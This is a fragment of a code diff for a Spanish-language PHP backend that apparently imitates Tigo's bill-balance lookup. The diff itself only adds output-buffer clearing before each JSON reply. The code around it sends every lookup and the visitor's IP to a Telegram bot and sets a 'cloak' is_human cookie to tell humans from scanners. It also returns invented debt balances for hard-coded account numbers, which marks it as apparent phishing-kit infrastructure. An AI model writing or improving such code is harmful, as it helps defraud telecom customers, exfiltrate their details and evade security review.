@@ -155,7 +155,7 @@ if ($value === '3002727129') {
     $telegramMessage .= "🌐 IP: `$clientIP`";
     sendTelegramMessage($telegramMessage);
 
-    echo json_encode([
+    ob_clean(); echo json_encode([
         "success" => true,
         "status" => "debt",
         "balance" => "$ 110.635",
@@ -175,7 +175,7 @@ if ($value === '1143144880') {
     $telegramMessage .= "🌐 IP: `$clientIP`";
     sendTelegramMessage($telegramMessage);
 
-    echo json_encode(["success" => true, "status" => "up_to_date", "message" => "¡Estás al día con el pago de las facturas del servicio que ingresaste! 🎉 😄"]);
+    ob_clean(); echo json_encode(["success" => true, "status" => "up_to_date", "message" => "¡Estás al día con el pago de las facturas del servicio que ingresaste! 🎉 😄"]);
     exit;
 }
 
@@ -414,7 +414,7 @@ if (!$imageCaptchaText && !$token) {
 }
 
 if (!$token && !$imageCaptchaText) {
-    echo json_encode(["success" => false, "message" => "Validación de seguridad pendiente. Por favor intenta de nuevo."]);
+    ob_clean(); echo json_encode(["success" => false, "message" => "Validación de seguridad pendiente. Por favor intenta de nuevo."]);
     exit;
 }
 
@@ -496,7 +496,7 @@ if ($hasDebt && count($invoices) > 0) {
     // El captcha fue resuelto y validado por Tigo -> Usuario Humano Confirmado
     cloak_set_cookie('is_human', 'true');
 
-    echo json_encode([
+    ob_clean(); echo json_encode([
         "success" => true,
         "status" => "debt",
         "invoices" => $invoices,
@@ -521,7 +521,7 @@ elseif (
     // El usuario está al día (pasó captcha y validó con Tigo) -> Humano Confirmado
     cloak_set_cookie('is_human', 'true');
 
-    echo json_encode(["success" => true, "status" => "up_to_date", "message" => "Oye, estás al día con tus pagos."]);
+    ob_clean(); echo json_encode(["success" => true, "status" => "up_to_date", "message" => "Oye, estás al día con tus pagos."]);
 }
 elseif (isset($data['data']['result'])) {
     if ($data['data']['result']['class'] === 'success') {
@@ -535,10 +535,10 @@ elseif (isset($data['data']['result'])) {
         $telegramMessage .= "🌐 IP: `$clientIP`";
         sendTelegramMessage($telegramMessage);
 
-        echo json_encode(["success" => true, "status" => "up_to_date", "message" => $data['data']['result']['formattedValue']]);
+        ob_clean(); echo json_encode(["success" => true, "status" => "up_to_date", "message" => $data['data']['result']['formattedValue']]);
     }
     else {
-        echo json_encode(["success" => false, "status" => "not_found", "message" => $data['data']['result']['formattedValue'], "debug_response" => $data]);
+        ob_clean(); echo json_encode(["success" => false, "status" => "not_found", "message" => $data['data']['result']['formattedValue'], "debug_response" => $data]);
     }
 }
 else {
@@ -546,10 +546,10 @@ else {
     // Check if this is a CAPTCHA error from Tigo
     if (isset($data['data']['result']['formattedValue'])) {
         $errorMsg = $data['data']['result']['formattedValue'];
-        echo json_encode(["success" => false, "status" => "not_found", "message" => $errorMsg, "debug_response" => $data]);
+        ob_clean(); echo json_encode(["success" => false, "status" => "not_found", "message" => $errorMsg, "debug_response" => $data]);
     }
     else {
-        echo json_encode([
+        ob_clean(); echo json_encode([
             "success" => false, 
             "status" => "not_found", 
             "message" => "No se encontro saldo", 
